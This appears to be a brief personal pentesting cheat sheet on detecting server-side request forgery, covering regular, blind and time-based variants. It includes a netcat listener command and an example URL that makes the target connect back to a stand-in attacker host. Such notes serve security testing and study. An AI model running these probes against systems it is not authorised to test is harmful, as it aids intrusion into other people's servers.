# SSRF
### SSRF is serer-side attacks
- To check if the application is vulnerable

```
1. Set up Netcat listener: nc -lnvp 5555
2. Try to connect back to our server. 
https://example.com/load?q=http://$ATTCKER:5555
3. If the connectino is established, the target is vulnerable to SSRF
```

### Blind SSRF
- Similar to regular SSRF, except that there's no information display on the front end. So we have to check.

```
1. Set up Netcat listener: nc -lnvp 5555
2. Upload file that can create connections to our machine
3. If the connection is established, the target is vulnerable.
```

### Time-based SSRF
- We can try to have the target to request resources and check the time it responds in BurpSuite. If the requested resources are invalid and it takes the applications way longer to respond, we can confirm the vulnerability

